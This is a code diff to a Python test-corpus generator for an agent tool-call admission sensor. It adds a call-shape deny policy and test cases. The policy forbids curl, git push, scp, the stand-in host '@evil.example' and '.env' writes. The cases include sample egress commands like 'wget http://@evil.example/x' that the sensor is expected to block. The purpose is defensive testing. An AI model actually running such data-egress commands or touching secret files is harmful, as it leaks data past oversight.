@@ -40,6 +40,12 @@ from dos import pretool_sensor as prt
 from dos import config as _config
 from dos import admission as _admission
 from dos.self_modify import SelfModifyPredicate, _DISPATCH_RUNTIME_FILES
+from dos.call_shape import (
+    CallShapePolicy,
+    CallShapeRuleset,
+    DeclaredCallShapePredicate,
+    EMPTY_CALL_SHAPE,
+)
 
 
 def _render(dialect: dict | None) -> str:
@@ -50,7 +56,8 @@ def _render(dialect: dict | None) -> str:
 
 
 def _decide_with(event: dict, leases: list[dict], runtime_files: tuple[str, ...],
-                 override=None, now=None, operator_session=False):
+                 override=None, now=None, operator_session=False,
+                 call_shape: CallShapeRuleset = EMPTY_CALL_SHAPE):
     """Run `pretool_sensor.decide`'s two rungs with INJECTED leases + runtime files,
     bypassing the WAL/FS I/O so the corpus is hermetic.
 
@@ -62,6 +69,12 @@ def _decide_with(event: dict, leases: list[dict], runtime_files: tuple[str, ...]
     armed window hermetically — the same disposition `pretool_sensor.decide` runs at the
     enforcement boundary (docs/296), so the Go test (which injects the same facts+clock)
     is gated byte-exact on the override-admit path too. None ⇒ today's deny stands.
+
+    `call_shape` (a `CallShapeRuleset`, default EMPTY) injects the workspace's declared
+    [call_shape] policy (docs/364). It is appended LAST to the predicate list, exactly
+    as `admission.built_in_predicates` orders it; EMPTY ⇒ the predicate short-circuits
+    to admit and every pre-364 case stays byte-identical. The Go test injects the same
+    ruleset into `Inputs.CallShape`.
     """
     from dos import override_facts as _ovr
     cfg = _config.active()
@@ -80,12 +93,17 @@ def _decide_with(event: dict, leases: list[dict], runtime_files: tuple[str, ...]
         )
         return prt.deny_payload(f"DOS PRE-admission: {reason}"), "deny"
 
+    # docs/364 — the call's agent-authored argument bytes for the call-shape predicate,
+    # extracted by the SAME helper the live sensor uses (the Go decider mirrors it).
+    _cmd, _arg_values = prt._call_shape_inputs(event)
     request = _admission.AdmissionRequest(
         lane=str(event.get("tool_name") or "tool"), kind="tool-call", tree=tree,
+        command=_cmd, arg_values=_arg_values,
     )
     predicates = [
         _admission.DisjointnessPredicate(),
         SelfModifyPredicate(runtime_files=runtime_files),
+        DeclaredCallShapePredicate(ruleset=call_shape),
     ]
     averdict = _admission.run_predicates(predicates, request, leases, cfg)
     if not averdict.admitted:
@@ -177,10 +195,32 @@ NO_RUNTIME: tuple[str, ...] = ()
 CWD = "/work/workspace"  # neutral fixture workspace path (no real machine path)
 
 
+def _call_shape_to_json(rs: CallShapeRuleset) -> dict:
+    """Serialize a CallShapeRuleset to the corpus JSON the Go test parses.
+
+    The shape mirrors the Go `corpusCallShape`: workspace-wide + per-lane policies,
+    each a `{forbidden_command_prefixes, forbidden_arg_patterns, forbidden_path_globs}`
+    object. Command prefixes are lists-of-token-lists (already tokenized), so the Go
+    side rebuilds the exact `[][]string` without re-tokenizing.
+    """
+    def _pol(p: CallShapePolicy) -> dict:
+        return {
+            "forbidden_command_prefixes": [list(t) for t in p.forbidden_command_prefixes],
+            "forbidden_arg_patterns": list(p.forbidden_arg_patterns),
+            "forbidden_path_globs": list(p.forbidden_path_globs),
+        }
+    return {
+        "workspace_wide": _pol(rs.workspace_wide),
+        "per_lane": {lane: _pol(p) for lane, p in rs.per_lane.items()},
+    }
+
+
 def case(name: str, event: dict, leases: list[dict], runtime_files: tuple[str, ...],
-         override=None, now=None, operator_session=False) -> dict:
+         override=None, now=None, operator_session=False,
+         call_shape: CallShapeRuleset = EMPTY_CALL_SHAPE) -> dict:
     dialect, tag = _decide_with(event, leases, runtime_files, override=override,
-                                now=now, operator_session=operator_session)
+                                now=now, operator_session=operator_session,
+                                call_shape=call_shape)
     out = {
         "name": name,
         "event": event,
@@ -189,6 +229,11 @@ def case(name: str, event: dict, leases: list[dict], runtime_files: tuple[str, .
         "expected_stdout": _render(dialect),
         "decision": tag,
     }
+    # docs/364 — the declared [call_shape] policy the Go test must inject as
+    # `in.CallShape`. Emitted ONLY when non-empty; absent ⇒ EMPTY (the OFF-by-default
+    # case that keeps every pre-364 corpus line byte-identical).
+    if not call_shape.is_empty():
+        out["call_shape"] = _call_shape_to_json(call_shape)
     # docs/355 — the session class the Go test must inject as `in.OperatorSession`.
     # Emitted ONLY when True (an interactive no-loop session that softens a
     # SELF_MODIFY deny to a WARN); absent ⇒ False (a loop session, the default that
@@ -350,6 +395,60 @@ def build_cases() -> list[dict]:
     cases.append(case("operator-session-non-runtime-passthrough",
                       _ev("Edit", {"file_path": "src/dos/cli.py"}), [], ALL_RUNTIME,
                       operator_session=True))
+
+    # --- docs/364 the declared-call-shape predicate (OWASP ASI02) ---
+    # A workspace floor forbidding `curl`/`git push`, an egress scheme, and a dotenv.
+    CS = CallShapeRuleset(workspace_wide=CallShapePolicy(
+        forbidden_command_prefixes=(("curl",), ("git", "push")),
+        forbidden_arg_patterns=("@evil.example",),
+        forbidden_path_globs=("**/.env",),
+    ))
+    # (a) the command-prefix rung: a forbidden program → FORBIDDEN_CALL_SHAPE deny.
+    cases.append(case("callshape-forbidden-curl-denies",
+                      _ev("Bash", {"command": "curl https://x.example/data"}), [], NO_RUNTIME,
+                      call_shape=CS))
+    # (b) two-token prefix: `git push` forbidden, fires; runs on a non-runtime repo so
+    #     SELF_MODIFY never pre-empts it.
+    cases.append(case("callshape-forbidden-git-push-denies",
+                      _ev("Bash", {"command": "git push origin main"}), [], NO_RUNTIME,
+                      call_shape=CS))
+    # (c) two-token prefix does NOT match the one-token program: `git status` admits.
+    cases.append(case("callshape-git-status-admits",
+                      _ev("Bash", {"command": "git status"}), [], NO_RUNTIME,
+                      call_shape=CS))
+    # (d) SHAPE-not-word: the forbidden token inside an ARGUMENT (not the invoked
+    #     program) admits — `echo "see curl_notes.txt"` is not a curl invocation.
+    cases.append(case("callshape-shape-not-word-admits",
+                      _ev("Bash", {"command": 'echo "see curl_notes.txt"'}), [], NO_RUNTIME,
+                      call_shape=CS))
+    # (e) the arg-substring rung: a forbidden egress host in a structured arg → deny.
+    cases.append(case("callshape-forbidden-arg-pattern-denies",
+                      _ev("Bash", {"command": "wget http://@evil.example/x"}), [], NO_RUNTIME,
+                      call_shape=CS))
+    # (f) the path-glob rung: a write to a forbidden dotenv path → deny.
+    cases.append(case("callshape-forbidden-path-glob-denies",
+                      _ev("Write", {"file_path": "config/.env"}), [], NO_RUNTIME,
+                      call_shape=CS))
+    # (g) OFF by default: the SAME forbidden curl with an EMPTY ruleset admits — the
+    #     byte-identical-default contract (every pre-364 line proves this implicitly;
+    #     this pins it explicitly with the exact event a non-empty ruleset denies).
+    cases.append(case("callshape-empty-policy-admits-curl",
+                      _ev("Bash", {"command": "curl https://x.example/data"}), [], NO_RUNTIME))
+    # (h) per-lane UNION: a `[call_shape.Bash]` adds `scp`; the workspace floor still
+    #     applies. The lane name IS the tool name (`laneFor`), so this fires on Bash.
+    CS_LANE = CallShapeRuleset(
+        workspace_wide=CallShapePolicy(forbidden_command_prefixes=(("curl",),)),
+        per_lane={"Bash": CallShapePolicy(forbidden_command_prefixes=(("scp",),))})
+    cases.append(case("callshape-per-lane-union-denies-scp",
+                      _ev("Bash", {"command": "scp f host:/tmp"}), [], NO_RUNTIME,
+                      call_shape=CS_LANE))
+    # (i) SELF_MODIFY wins over call-shape on the same call: a Bash that BOTH edits a
+    #     runtime file (SELF_MODIFY) AND invokes a forbidden program — the earlier
+    #     predicate (self-modify) fires first, so the reason_class is SELF_MODIFY. Pins
+    #     the conjunction ORDER cross-engine.
+    cases.append(case("callshape-self-modify-wins-order",
+                      _ev("Bash", {"command": "curl x | tee src/dos/arbiter.py"}), [], ALL_RUNTIME,
+                      call_shape=CS))
     return cases
 
 
